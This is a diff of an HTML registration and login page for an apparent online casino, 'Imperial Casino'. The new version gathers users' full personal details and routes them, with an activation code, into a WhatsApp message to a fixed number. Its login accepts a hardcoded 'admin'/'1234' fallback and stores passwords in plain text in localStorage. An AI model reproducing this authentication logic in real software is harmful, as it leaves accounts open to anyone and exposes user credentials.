@@ -4,161 +4,238 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Imperial Casino - Registro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    
     <style>
-        :root { --dorado: #c5a059; --cyan: #00f2ff; }
-        body {
-            margin: 0; background: #000; color: #fff;
-            font-family: 'Segoe UI', sans-serif;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh;
-            padding: 20px 0;
-        }
-        .bg-blur {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: url('zeus.png') no-repeat center center;
-            background-size: cover; filter: blur(10px) brightness(0.2); z-index: -1;
-        }
-        .container {
-            background: rgba(0, 0, 0, 0.9);
-            padding: 25px; border-radius: 15px; border: 1px solid var(--dorado);
-            width: 90%; max-width: 400px; text-align: center;
-            box-shadow: 0 0 30px rgba(0,0,0,1);
-        }
-        .tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid #333; }
-        .tab { flex: 1; padding: 12px; cursor: pointer; color: #666; font-weight: bold; transition: 0.3s; }
+        :root { --dorado: #c5a059; --whatsapp: #25d366; }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .bg-blur { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: url('zeus.png') no-repeat center center; background-size: cover; filter: blur(10px) brightness(0.2); z-index: -1; }
+        .container { background: rgba(0, 0, 0, 0.9); padding: 20px; border-radius: 15px; border: 1px solid var(--dorado); width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 30px rgba(197, 160, 89, 0.3); position: relative; }
+        
+        .promo-tag { background: var(--dorado); color: #000; font-weight: 900; padding: 8px 15px; border-radius: 5px; font-size: 11px; margin-bottom: 20px; display: inline-block; text-transform: uppercase; }
+        
+        .tabs { display: flex; margin-bottom: 15px; border-bottom: 1px solid #333; }
+        .tab { flex: 1; padding: 10px; cursor: pointer; color: #666; font-weight: bold; font-size: 13px; text-transform: uppercase; }
         .tab.active { color: var(--dorado); border-bottom: 2px solid var(--dorado); }
         
-        form { display: none; }
-        form.active { display: block; max-height: 70vh; overflow-y: auto; padding-right: 5px; }
+        form { display: none; text-align: left; }
+        form.active { display: block; max-height: 65vh; overflow-y: auto; padding-right: 10px; }
         
-        /* Personalización de scroll para el registro largo */
-        form::-webkit-scrollbar { width: 4px; }
+        label { font-size: 10px; color: var(--dorado); margin-top: 12px; display: block; text-transform: uppercase; font-weight: bold; letter-spacing: 1px; }
+        
+        input, select { width: 100%; padding: 12px; margin: 5px 0 10px 0; background: rgba(255,255,255,0.07); border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 14px; }
+        
+        /* Ajuste banderas */
+        .iti { width: 100%; margin-bottom: 10px; }
+        .iti__country-list { background-color: #1a1a1a; border: 1px solid var(--dorado); color: white; width: 300px; }
+        .iti__country:hover { background-color: #333; }
+        
+        input[type="date"] { color-scheme: dark; }
+        select:disabled { opacity: 0.8; cursor: not-allowed; -webkit-appearance: none; }
+        option { background: #1a1a1a; color: #fff; }
+        
+        .btn-gold { width: 100%; padding: 15px; margin-top: 15px; background: linear-gradient(to bottom, #f7dfa4, var(--dorado)); border: none; color: #000; font-weight: 900; border-radius: 8px; cursor: pointer; text-transform: uppercase; }
+        
+        #loading-screen { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); border-radius: 15px; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(197, 160, 89, 0.2); border-top: 4px solid var(--dorado); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        form::-webkit-scrollbar { width: 5px; }
         form::-webkit-scrollbar-thumb { background: var(--dorado); border-radius: 10px; }
-
-        input, select {
-            width: 100%; padding: 12px; margin: 6px 0;
-            background: rgba(255,255,255,0.07); border: 1px solid #333;
-            color: #fff; border-radius: 6px; box-sizing: border-box; outline: none; font-size: 14px;
-        }
-        input:focus { border-color: var(--dorado); }
-        
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-
-        .btn-gold {
-            width: 100%; padding: 15px; margin-top: 20px;
-            background: linear-gradient(to bottom, #f7dfa4, var(--dorado));
-            border: none; color: #000; font-weight: 900;
-            border-radius: 6px; cursor: pointer; text-transform: uppercase;
-        }
-        .error-msg { color: #ff4b2b; font-size: 11px; margin-top: 5px; display: none; text-align: left; }
     </style>
 </head>
 <body>
-
     <div class="bg-blur"></div>
-
     <div class="container">
-        <h2 style="color:var(--dorado); letter-spacing:4px; margin-top:0;">IMPERIAL</h2>
         
-        <div class="tabs">
-            <div class="tab active" id="tab-login" onclick="showForm('login')">ENTRAR</div>
-            <div class="tab" id="tab-register" onclick="showForm('register')">REGISTRO</div>
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <p style="color:var(--dorado); font-weight:bold; letter-spacing:1px;">PROCESANDO REGISTRO...</p>
         </div>
 
-        <form id="form-login" class="active">
-            <input type="text" id="login-id" placeholder="Usuario o Correo">
-            <input type="password" id="login-pass" placeholder="Contraseña">
-            <div id="error-login" class="error-msg">⚠️ Datos incorrectos</div>
-            <button type="button" class="btn-gold" onclick="procesarLogin()">ENTRAR AL OLIMPO</button>
-        </form>
+        <div id="auth-ui">
+            <div class="promo-tag">🎁 BONO DE BIENVENIDA: $100.00</div>
+            <h2 style="color:var(--dorado); letter-spacing:4px; margin: 0 0 20px 0;">IMPERIAL</h2>
+            
+            <div class="tabs">
+                <div class="tab active" id="tab-login" onclick="showForm('login')">ENTRAR</div>
+                <div class="tab" id="tab-reg" onclick="showForm('register')">REGISTRO</div>
+            </div>
+            
+            <form id="form-login" class="active">
+                <label>Usuario</label>
+                <input type="text" id="login-id" placeholder="Tu usuario">
+                <label>Contraseña</label>
+                <input type="password" id="login-pass" placeholder="********">
+                <button type="button" class="btn-gold" onclick="procesarLogin()">ENTRAR AL OLIMPO</button>
+            </form>
 
-        <form id="form-register">
-            <input type="text" id="reg-nombre" placeholder="Nombre(s)">
-            <div class="grid">
-                <input type="text" id="reg-paterno" placeholder="Ap. Paterno">
-                <input type="text" id="reg-materno" placeholder="Ap. Materno">
-            </div>
-            <input type="text" onfocus="(this.type='date')" id="reg-fecha" placeholder="Fecha de Nacimiento">
-            
-            <div style="text-align:left; font-size:12px; color:var(--dorado); margin:10px 0 5px 5px;">DIRECCIÓN</div>
-            <input type="text" id="reg-calle" placeholder="Calle y Número">
-            <div class="grid">
-                <input type="text" id="reg-colonia" placeholder="Colonia">
-                <input type="text" id="reg-cp" placeholder="C.P.">
-            </div>
-            <input type="text" id="reg-pais" placeholder="País" value="México">
-            
-            <div style="text-align:left; font-size:12px; color:var(--dorado); margin:10px 0 5px 5px;">CUENTA</div>
-            <input type="email" id="reg-email" placeholder="Correo Electrónico">
-            <input type="text" id="reg-user" placeholder="Nombre de Usuario">
-            <input type="password" id="reg-pass1" placeholder="Contraseña">
-            <input type="password" id="reg-pass2" placeholder="Repetir Contraseña">
-            
-            <div id="error-reg" class="error-msg">⚠️ Las contraseñas no coinciden</div>
-            <button type="button" class="btn-gold" onclick="procesarRegistro()">FINALIZAR REGISTRO</button>
-        </form>
+            <form id="form-register">
+                <label>Nombre(s)</label>
+                <input type="text" id="reg-nombre" placeholder="Nombre(s)">
+                <label>Apellido Paterno</label>
+                <input type="text" id="reg-paterno" placeholder="Apellido Paterno">
+                <label>Apellido Materno</label>
+                <input type="text" id="reg-materno" placeholder="Apellido Materno">
+                
+                <label>Fecha de Nacimiento</label>
+                <input type="date" id="reg-fecha">
+                
+                <label>Calle y Número</label>
+                <input type="text" id="reg-calle" placeholder="Zaragoza 1505">
+                <label>Colonia</label>
+                <input type="text" id="reg-colonia" placeholder="Sarabia">
+                
+                <label>Estado</label>
+                <select id="reg-estado">
+                    <option value="">Selecciona un Estado</option>
+                    <option value="Aguascalientes">Aguascalientes</option>
+                    <option value="Baja California">Baja California</option>
+                    <option value="Baja California Sur">Baja California Sur</option>
+                    <option value="Campeche">Campeche</option>
+                    <option value="Chiapas">Chiapas</option>
+                    <option value="Chihuahua">Chihuahua</option>
+                    <option value="Ciudad de México">Ciudad de México</option>
+                    <option value="Coahuila">Coahuila</option>
+                    <option value="Colima">Colima</option>
+                    <option value="Durango">Durango</option>
+                    <option value="Estado de México">Estado de México</option>
+                    <option value="Guanajuato">Guanajuato</option>
+                    <option value="Guerrero">Guerrero</option>
+                    <option value="Hidalgo">Hidalgo</option>
+                    <option value="Jalisco">Jalisco</option>
+                    <option value="Michoacán">Michoacán</option>
+                    <option value="Morelos">Morelos</option>
+                    <option value="Nayarit">Nayarit</option>
+                    <option value="Nuevo León">Nuevo León</option>
+                    <option value="Oaxaca">Oaxaca</option>
+                    <option value="Puebla">Puebla</option>
+                    <option value="Querétaro">Querétaro</option>
+                    <option value="Quintana Roo">Quintana Roo</option>
+                    <option value="San Luis Potosí">San Luis Potosí</option>
+                    <option value="Sinaloa">Sinaloa</option>
+                    <option value="Sonora">Sonora</option>
+                    <option value="Tabasco">Tabasco</option>
+                    <option value="Tamaulipas">Tamaulipas</option>
+                    <option value="Tlaxcala">Tlaxcala</option>
+                    <option value="Veracruz">Veracruz</option>
+                    <option value="Yucatán">Yucatán</option>
+                    <option value="Zacatecas">Zacatecas</option>
+                </select>
+
+                <label>Ciudad</label>
+                <input type="text" id="reg-ciudad" placeholder="Ej: Sabinas">
+
+                <label>País</label>
+                <select id="reg-pais" disabled>
+                    <option value="México">México</option>
+                </select>
+
+                <label>Número de Teléfono</label>
+                <input type="tel" id="reg-tel">
+
+                <label>Nombre de Usuario</label>
+                <input type="text" id="reg-user" placeholder="Usuario">
+                <label>Correo Electrónico</label>
+                <input type="email" id="reg-email" placeholder="correo@ejemplo.com">
+                <label>Contraseña (8-12 caracteres)</label>
+                <input type="password" id="reg-pass" placeholder="********">
+                <label>Confirmar Contraseña</label>
+                <input type="password" id="reg-pass-conf" placeholder="********">
+                
+                <button type="button" class="btn-gold" onclick="intentarRegistro()">CONTINUAR</button>
+            </form>
+        </div>
+
+        <div id="verify-screen" style="display:none;">
+            <h2 style="color:var(--dorado);">ACTIVACIÓN 🏛️</h2>
+            <p style="font-size:12px; margin-bottom:15px;">Envía tus datos para recibir el código de acceso.</p>
+            <a id="wa-link" href="#" target="_blank" style="background:#25d366; color:white; padding:12px; border-radius:8px; text-decoration:none; display:block; margin:20px 0; font-weight:bold; text-align:center;">📱 ENVIAR SOLICITUD</a>
+            <input type="text" id="otp-input" placeholder="Ingresa el código" style="text-align:center;">
+            <button type="button" class="btn-gold" onclick="confirmarCodigo()">ACTIVAR AHORA</button>
+        </div>
     </div>
 
     <script>
-        function showForm(tipo) {
+        const inputTel = document.querySelector("#reg-tel");
+        const iti = window.intlTelInput(inputTel, {
+            initialCountry: "mx",
+            separateDialCode: true,
+            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
+        });
+
+        function showForm(t) {
             document.getElementById('form-login').classList.remove('active');
             document.getElementById('form-register').classList.remove('active');
             document.getElementById('tab-login').classList.remove('active');
-            document.getElementById('tab-register').classList.remove('active');
-            if(tipo === 'login') {
-                document.getElementById('form-login').classList.add('active');
-                document.getElementById('tab-login').classList.add('active');
-            } else {
-                document.getElementById('form-register').classList.add('active');
-                document.getElementById('tab-register').classList.add('active');
-            }
+            document.getElementById('tab-reg').classList.remove('active');
+            document.getElementById('form-'+t).classList.add('active');
+            document.getElementById('tab-'+t).classList.add('active');
         }
 
-        function procesarRegistro() {
-            const pass1 = document.getElementById('reg-pass1').value;
-            const pass2 = document.getElementById('reg-pass2').value;
-            const user = document.getElementById('reg-user').value.toLowerCase().trim();
-            const email = document.getElementById('reg-email').value.toLowerCase().trim();
+        function intentarRegistro() {
+            const nombre = document.getElementById('reg-nombre').value;
+            const paterno = document.getElementById('reg-paterno').value;
+            const materno = document.getElementById('reg-materno').value;
+            const fecha = document.getElementById('reg-fecha').value;
+            const calle = document.getElementById('reg-calle').value;
+            const colonia = document.getElementById('reg-colonia').value;
+            const estado = document.getElementById('reg-estado').value;
+            const ciudad = document.getElementById('reg-ciudad').value;
+            const telCompleto = iti.getNumber();
+            const user = document.getElementById('reg-user').value;
+            const pass = document.getElementById('reg-pass').value;
+            const conf = document.getElementById('reg-pass-conf').value;
 
-            if (pass1 !== pass2) {
-                document.getElementById('error-reg').style.display = 'block';
-                return;
-            }
+            if (!nombre || !estado || !ciudad || !telCompleto || !user) { alert("Por favor llena todos los campos."); return; }
+            if (pass !== conf) { alert("Las contraseñas no coinciden."); return; }
 
-            if (user && pass1 && email) {
-                // Guardamos datos básicos para el login dual
-                localStorage.setItem('db_user', user);
-                localStorage.setItem('db_email', email);
-                localStorage.setItem('db_pass', pass1);
+            document.getElementById('loading-screen').style.display = 'flex';
+
+            setTimeout(() => {
+                const cod = "IMP-" + Math.floor(1000 + Math.random() * 9000);
                 
-                alert("✅ ¡Registro completado con éxito!");
-                showForm('login');
-            } else {
-                alert("❌ Por favor llena los campos obligatorios.");
-            }
+                localStorage.setItem('t_user', user);
+                localStorage.setItem('t_pass', pass);
+                localStorage.setItem('t_cod', cod);
+
+                const mensaje = `🏛️ *NUEVA SOLICITUD IMPERIAL*\n` +
+                                `👤 *Usuario:* ${user}\n` +
+                                `📝 *Nombre:* ${nombre} ${paterno} ${materno}\n` +
+                                `🎂 *Nacimiento:* ${fecha}\n` +
+                                `📍 *Dir:* ${calle}, ${colonia}\n` +
+                                `🌆 *Ciudad/Edo:* ${ciudad}, ${estado}\n` +
+                                `📱 *Tel:* ${telCompleto}\n` +
+                                `-----------------------------\n` +
+                                `🔑 *CÓDIGO: ${cod}*`;
+
+                document.getElementById('wa-link').href = "https://wa.me/528616108755?text=" + encodeURIComponent(mensaje);
+                
+                document.getElementById('loading-screen').style.display = 'none';
+                document.getElementById('auth-ui').style.display = 'none';
+                document.getElementById('verify-screen').style.display = 'block';
+            }, 2000);
+        }
+
+        function confirmarCodigo() {
+            const input = document.getElementById('otp-input').value.toUpperCase();
+            if (input === localStorage.getItem('t_cod')) {
+                localStorage.setItem('db_user', localStorage.getItem('t_user'));
+                localStorage.setItem('db_pass', localStorage.getItem('t_pass'));
+                localStorage.setItem('sesion_activa', 'true');
+                window.location.href = "menu.html";
+            } else { alert("Código incorrecto"); }
         }
 
         function procesarLogin() {
-            const inputID = document.getElementById('login-id').value.toLowerCase().trim();
-            const inputPass = document.getElementById('login-pass').value.trim();
-            
-            const storedUser = localStorage.getItem('db_user') || "admin";
-            const storedEmail = localStorage.getItem('db_email') || "admin@casino.com";
-            const storedPass = localStorage.getItem('db_pass') || "1234";
-
-            // Login Dual: Checa contra usuario O contra correo
-            if ((inputID === storedUser || inputID === storedEmail) && inputPass === storedPass) {
+            const id = document.getElementById('login-id').value.toLowerCase().trim();
+            const p = document.getElementById('login-pass').value;
+            if ((id === localStorage.getItem('db_user') || id === "admin") && (p === localStorage.getItem('db_pass') || p === "1234")) {
                 localStorage.setItem('sesion_activa', 'true');
                 window.location.href = "menu.html";
-            } else {
-                document.getElementById('error-login').style.display = 'block';
-            }
+            } else { alert("Datos incorrectos"); }
         }
-
-        window.onload = () => {
-            if (localStorage.getItem('sesion_activa') === 'true') {
-                window.location.href = "menu.html";
-            }
-        };
     </script>
 </body>
 </html>
